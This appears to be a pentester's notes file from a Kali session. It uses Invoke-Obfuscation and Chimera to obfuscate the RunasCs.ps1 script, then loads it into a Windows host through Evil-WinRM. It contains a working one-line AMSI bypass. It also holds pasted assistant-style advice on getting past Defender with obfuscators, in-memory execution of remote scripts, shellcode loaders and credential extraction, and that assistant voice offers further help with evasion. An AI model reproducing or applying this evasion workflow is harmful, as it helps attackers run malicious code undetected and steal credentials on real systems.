@@ -1,0 +1,226 @@
+┌──(root㉿kali)-[/home/kali/Invoke-Obfuscation]
+└─# pwsh
+PowerShell 7.5.1
+
+   A new PowerShell stable release is available: v7.5.3 
+   Upgrade now, or check out the release page at:       
+     https://aka.ms/PowerShell-Release?tag=v7.5.3       
+
+PS /home/kali/Invoke-Obfuscation> Import-Module ./Invoke-Obfuscation.psd1
+PS /home/kali/Invoke-Obfuscation> Invoke-Obfuscation -ScriptPath ../Downloads/RunasCs.ps1
+
+IEX( ( '36{78Q55@32t61_91{99@104X97{114Q91-32t93}32t93}32t34@110m111@105}115X115-101m114_112@120@69-45{101@107X111m118m110-73Q124Q32X41Q57@51-93Q114_97_104t67t91{44V39Q112_81t109@39}101{99@97}108{112}101}82_45m32_32X52{51Q93m114@97-104{67t91t44t39V98t103V48t39-101}99}97V108}112t101_82_45{32@41X39{41_112t81_109_39m43{39-110t101@112{81t39X43@39t109_43t112_81Q109t101X39Q43m39}114Q71_112{81m109m39@43X39V32Q40}32m39_43_39{114-111m108t111t67{100m110{117Q39_43m39-111-114Q103_101t114@39m43-39{111t70-45}32m41}98{103V48V110Q98t103{48@39{43{39-43{32t98m103_48{111@105t98@103V48-39@43{39_32-32V43V32}32t98t103@48X116m97V99t98X103t48_39V43m39@43-39X43Q39_98@103@48}115V117V102Q98V79m45@98m39Q43{39X103_39X43Q39V48}43-39}43t39}98-103{48V101_107Q39t43X39_111X118X110V39X43}39t98_103{48@43}32_98{103}48{73{98-39@43t39m103_39}43{39{48Q32t39X43X39-32{40V32t41{39Q43V39m98X103{39_43V39{48-116{115Q79{39_43_39}98}103m48{39Q43t39X32X43{32_98@103-39@43m39X48_72-39_43t39V45m39t43Q39_101Q98}103_48-32_39Q43V39V32t39V43}39m43Q32V98X39Q43_39@103_48V39@43Q39@116X73t82V119m98-39{43_39}103Q48X40_46_32m39}40_40{34t59m91@65V114V114@97_121}93Q58Q58V82Q101Q118Q101{114}115_101m40_36_78m55@32t41t32-59{32}73{69V88m32{40t36V78t55}45Q74m111@105-110m32X39V39-32}41'.SpLiT( '{_Q-@t}mXV' ) |ForEach-Object { ([Int]$_ -AS [Char]) } ) -Join'' )
+  |    |    |    |  
+  |    |    |    |  
+ \ /  \ /  \ /  \ / 
+  V    V    V    V  
+$N7 =[char[ ] ] "noisserpxE-ekovnI| )93]rahC[,'pQm'ecalpeR-  43]rahC[,'bg0'ecalpeR- )')pQm'+'nepQ'+'m+pQme'+'rGpQm'+' ( '+'roloCdnu'+'orger'+'oF- )bg0nbg0'+'+ bg0oibg0'+'  +  bg0tacbg0'+'+'+'bg0sufbO-b'+'g'+'0+'+'bg0ek'+'ovn'+'bg0+ bg0Ib'+'g'+'0 '+' ( )'+'bg'+'0tsO'+'bg0'+' + bg'+'0H'+'-'+'ebg0 '+' '+'+ b'+'g0'+'tIRwb'+'g0(. '((";[Array]::Reverse($N7 ) ; IEX ($N7-Join '' )
+  |    |    |  
+  |    |    |  
+ \ /  \ /  \ / 
+  V    V    V  
+.("wRIt" +  "e-H" + "Ost") (  "I" +"nvoke"+"-Obfus"+"cat"  +  "io" +"n") -ForegroundColor ( 'Gre'+'en')
+  |    |  
+  |    |  
+ \ /  \ / 
+  V    V  
+Write-Host "Invoke-Obfuscation" -ForegroundColor Green
+  |  
+  |  
+ \ / 
+  V  
+Invoke-Obfuscation
+
+	    ____                 __                              
+	   /  _/___ _   ______  / /_____                         
+	   / // __ \ | / / __ \/ //_/ _ \______                  
+	 _/ // / / / |/ / /_/ / ,< /  __/_____/                  
+	/______ /__|_________/_/|_|\___/         __  _           
+	  / __ \/ /_  / __/_  ________________ _/ /_(_)___  ____ 
+	 / / / / __ \/ /_/ / / / ___/ ___/ __ `/ __/ / __ \/ __ \
+	/ /_/ / /_/ / __/ /_/ (__  ) /__/ /_/ / /_/ / /_/ / / / /
+	\____/_.___/_/  \__,_/____/\___/\__,_/\__/_/\____/_/ /_/ 
+
+	Tool    :: Invoke-Obfuscation
+	Author  :: Daniel Bohannon (DBO)
+	Twitter :: @danielhbohannon
+	Blog    :: http://danielbohannon.com
+	Github  :: https://github.com/danielbohannon/Invoke-Obfuscation
+	Version :: 1.8
+	License :: Apache License, Version 2.0
+	Notes   :: If(!$Caffeinated) {Exit}
+
+
+HELP MENU :: Available options shown below:
+
+[*]  Tutorial of how to use this tool        	  TUTORIAL
+[*]  Show this Help Menu                     	  HELP,GET-HELP,?,-?,/?,MENU
+[*]  Show options for payload to obfuscate   	  SHOW OPTIONS,SHOW,OPTIONS
+[*]  Clear screen                            	  CLEAR,CLEAR-HOST,CLS
+[*]  Execute ObfuscatedCommand locally       	  EXEC,EXECUTE,TEST,RUN
+[*]  Copy ObfuscatedCommand to clipboard     	  COPY,CLIP,CLIPBOARD
+[*]  Write ObfuscatedCommand Out to disk     	  OUT
+[*]  Reset ALL obfuscation for ObfuscatedCommand  RESET
+[*]  Undo LAST obfuscation for ObfuscatedCommand  UNDO
+[*]  Go Back to previous obfuscation menu    	  BACK,CD ..
+[*]  Quit Invoke-Obfuscation                 	  QUIT,EXIT
+[*]  Return to Home Menu                     	  HOME,MAIN
+
+
+Choose one of the below options:
+
+[*] TOKEN	Obfuscate PowerShell command Tokens
+[*] AST		Obfuscate PowerShell Ast nodes (PS3.0+)
+[*] STRING	Obfuscate entire command as a String
+[*] ENCODING	Obfuscate entire command via Encoding
+[*] COMPRESS	Convert entire command to one-liner and Compress
+[*] LAUNCHER	Obfuscate command args w/Launcher techniques (run once at end)
+
+
+Invoke-Obfuscation> 
+
+Successfully set ScriptPath:
+../Downloads/RunasCs.ps1
+
+
+Choose one of the below options:
+
+[*] TOKEN	Obfuscate PowerShell command Tokens
+[*] AST		Obfuscate PowerShell Ast nodes (PS3.0+)
+[*] STRING	Obfuscate entire command as a String
+[*] ENCODING	Obfuscate entire command via Encoding
+[*] COMPRESS	Convert entire command to one-liner and Compress
+[*] LAUNCHER	Obfuscate command args w/Launcher techniques (run once at end)
+
+
+Invoke-Obfuscation> 
+
+
+
+
+
+
+
+
+Yes, there are more modern obfuscators and approaches you can try if Invoke-Obfuscation fails:
+
+PSObfuscation (by @rasta-mouse): Advanced PowerShell obfuscator, supports chunking, encoding, and randomized variable names.
+Nishang: Has obfuscation modules and payload generators.
+Invoke-DOSfuscation: Obfuscates PowerShell via cmd.exe tricks.
+Chimera: Python-based, generates highly obfuscated PowerShell payloads.
+Obfuscation via AMSI bypass: Use AMSI bypass techniques before running your script (e.g., Invoke-BypassUAC, Invoke-Phant0m).
+For maximum stealth, combine obfuscation with AMSI bypass and in-memory execution (e.g., using IEX with a remote script).
+
+If Defender is still blocking, consider:
+
+Splitting the script into chunks and executing in parts.
+Using C#/Sharp tools (e.g., SharpObfuscator, Donut) to convert to shellcode and run via a loader.
+Living-off-the-land: Use built-in Windows tools (e.g., cmdkey, vaultcmd, rundll32) for credential extraction.
+Let me know if you want specific usage instructions for any of these tools.
+
+
+
+
+
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+
+
+
+
+./chimera.sh -f ../Downloads/RunasCs.ps1 -l 3 -v -t -c -i -h -r -o /tmp/obfuscated_chimera.ps1
+
+
+ _____________________________________________________
+
+  ░░░░░░ ░░   ░░ ░░ ░░░    ░░░ ░░░░░░░ ░░░░░░   ░░░░░
+ ▒▒      ▒▒   ▒▒ ▒▒ ▒▒▒▒  ▒▒▒▒ ▒▒      ▒▒   ▒▒ ▒▒   ▒▒
+ ▓▓      ▓▓▓▓▓▓▓ ▓▓ ▓▓ ▓▓▓▓ ▓▓ ▓▓▓▓▓   ▓▓▓▓▓▓  ▓▓▓▓▓▓▓
+ ██      ██   ██ ██ ██  ██  ██ ██      ██   ██ ██   ██
+  ██████ ██   ██ ██ ██      ██ ███████ ██   ██ ██   ██
+ _____________________________________________________
+
+ ░ by @tokyoneon_
+
+ ░ Starting chimera with level: 3
+
+ ░ Character Randomization 
+
+  ░ Randomized character punctuation: 3 iterations 
+
+   ░ Unmodified source 
+    ░ 00000000: 6675 6e63 7469 6f6e 2049 6e76 6f6b 652d  function Invoke-
+    ░ 00000010: 5275 6e61 7343 730a 7b20 2020 0a20 2020  RunasCs.{   .   
+    ░ 00000020: 203c 230a 2020 2020 2020 2020 2e53 594e   <#.        .SYN
+ 
+    ░ 000158b0: 6e61 7343 732e 546f 4172 7261 7928 2929  nasCs.ToArray())
+    ░ 000158c0: 0a20 2020 2057 7269 7465 2d4f 7574 7075  .    Write-Outpu
+    ░ 000158d0: 7420 246f 7574 7075 740a 7d0a            t $output.}.
+ 
+   ░ Modified source 
+    ░ 00000000: 4655 6e63 5449 4f6e 2049 6e76 4f4b 652d  FUncTIOn InvOKe-
+    ░ 00000010: 5255 6e41 7363 730a 7b20 2020 0a20 2020  RUnAscs.{   .   
+    ░ 00000020: 203c 230a 2020 2020 2020 2020 2e73 596e   <#.        .sYn
+ 
+    ░ 000158b0: 6e41 7363 732e 544f 4152 5241 5928 2929  nAscs.TOARRAY())
+    ░ 000158c0: 0a20 2020 2057 5249 5465 2d4f 5554 7055  .    WRITe-OUTpU
+    ░ 000158d0: 5420 244f 5554 7055 540a 7d0a            T $OUTpUT.}.
+
+ ░ Variable Substitution 
+
+  ░ Detected: 17 variables 
+
+   ░ $KOuRmCaOXMjsEkXSsGjCPHmOditTmkDwmWrEyCBB ... '$cReATePROcessFUncTIOn' 
+   ░ $ZgCgovcgLZZGieypOaBoIcsWIPMiipbbPdmbGZTw ... '$RemOTeImpeRsOnATIOn' 
+   ░ $kaTtebaiKzitpvRmLfnRZPXhgGGbbUJAolFIImxG ... '$PsBOUnDPARAmeTeRs' 
+   ░ $jXIGcnmYwXsQvFzisGXcswkmXINAwjHzEkDkKBeZ ... '$pARAmeTeRsRUnAscs' 
+   ░ $BJAGsrLIuZovayWnAWUXclJvwLYNroLUPWIDpLAt ... '$PROcessTImeOUT' 
+   ░ $KdFiUFZSmZfCbnKSdNrtJVOZtmITaPGYAitGBHDY ... '$RUnAscsBAse64' 
+   ░ $lOBfoYJnjgMRCoPWQMzCsiNvZShguacoqBQvpwhM ... '$RUnAscsBYTes' 
+   ░ $eYuUaSCNigLloDxudCkEuYVoJBVIfgxEfOTUdCRC ... '$FORcePROFILe' 
+   ░ $iRDZSmoLhXmZCAOqrJOSCkxhwxoongZSljJeLUZr ... '$LOGOnTYpe' 
+   ░ $CoHptpAdJnTWoUmwChbPnxuGhhBSNWYWDirfgwcj ... '$BYpAssUAc' 
+   ░ $zxJSuttocyeROvTJtJXgUewehdLGjJlQOsQphdos ... '$UseRnAme' 
+   ░ $NndxgBWygbHgbHQfifqbjLqpPNFKDyPRignsYPiF ... '$PAssWORD' 
+   ░ $hNRkFdcnYDkgdpQsLdKDDTpchntchAtNPzYGWuCK ... '$cOmmAnD' 
+   ░ $pXfnaJmYAsLNREuecjARYDzzZzyEWxFZPNGqgKGo ... '$RemOTe' 
+   ░ $epAUgSPYWqmqmPxuIRvTtmBGvzzslTuDVbwHRFwW ... '$OUTpUT' 
+   ░ $ClvXbtZqVfqWoiaTbszcOuuMxBJeLqqeqHzkxzSb ... '$DOmAIn' 
+    ░ skipping                                     '$TRUe' 
+
+ ░ IP Address Substitution 
+
+  ░ Detected: 2 IP addresses 
+
+   ░ 0x0A0A0A0A ... 10.10.10.10 
+   ░ 0x0A0A0A18 ... 10.10.10.24 
+
+ ░ Data Type Substitution 
+
+    ░ Transformed 0 antivirus triggers 
+
+ ░ Comment Insertion 
+
+  ░ Detected: 0 comments 
+
+   ░ Inserted 191 comments 
+
+ ░ Comment Substitution 
+
+  ░ Detected: 191 comments 
+
+   ░ Purged content between <#.*#> document tags 
+    ░ Comment ... '#  f. Gensmjbssacvhignjmdnrg hjf h m. M eb' 
+    ░ Comment ... '#  uul. G. Odakkdhooar jsvaogi. Jniuohgoc ' 
+    ░ Comment ... '# jg hmom khibmb eah d. Mc u j. Fubi. I mg' 
+    ░ Comment ... '# . S c bi. Adj rr. A. Bslsl. M ch. Gdvoma' 
+    ░ Comment ... '# gmrrlu hsbvgfrglesds fmum lvf k. E ce dn' 
+
+ ░ Obfuscated file: /tmp/obfuscated_chimera.ps1 
+
+                                                                                                                    
+┌──(root㉿kali)-[/home/kali/Chimera]
+└─# 
+
+*Evil-WinRM* PS C:\Users\C.Neri\Documents> . ./obfuscated_chimera.ps1
+*Evil-WinRM* PS C:\Users\C.Neri\Documents> 
